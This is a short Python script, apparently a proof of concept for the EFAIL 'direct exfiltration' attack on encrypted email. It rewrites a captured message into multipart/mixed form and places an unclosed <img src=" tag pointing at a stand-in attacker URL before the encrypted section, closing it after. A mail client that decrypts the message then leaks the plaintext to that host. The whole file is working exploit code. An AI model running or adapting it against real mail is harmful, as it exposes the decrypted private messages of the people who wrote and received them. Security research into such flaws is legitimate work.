# Easiest way to exfiltrate:
# Simply add a non-encrypted, non closed <img src=".... tag
# read as text/html by the mail client

import sys

ATTACKER_URL = 'http://attacker_server_url/'


def add_direct_exfiltration(filepath):
    """
    Make the email multipart/mixed and add a non-encrypted <img> tag opening before
    the encrypted section, and closing after
    """
    with open(filepath) as f:
        mailLines = f.read().splitlines()
    recipientLineIndex = next(i for i, v in enumerate(
        mailLines) if v.lower()[:3] == 'to:')
    craftedMail = mailLines[:recipientLineIndex + 1]
    craftedMail += ['Content-Type: multipart/mixed;boundary="BOUNDARY"',
                    '',
                    '------BOUNDARY',
                    'Content-Type: text/html',
                    '',
                    '<img src="' + ATTACKER_URL,
                    '------BOUNDARY']
    craftedMail += mailLines[recipientLineIndex + 1:]
    craftedMail += ['------BOUNDARY',
                    'Content-Type: text/html',
                    '">',
                    '------BOUNDARY']
    return '\n'.join(craftedMail)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise TypeError("Wrong number of arguments")
    filepath = sys.argv[1]
    with open('email_with_exfiltration_channel.txt', 'w') as outf:
        outf.write(add_direct_exfiltration(filepath))
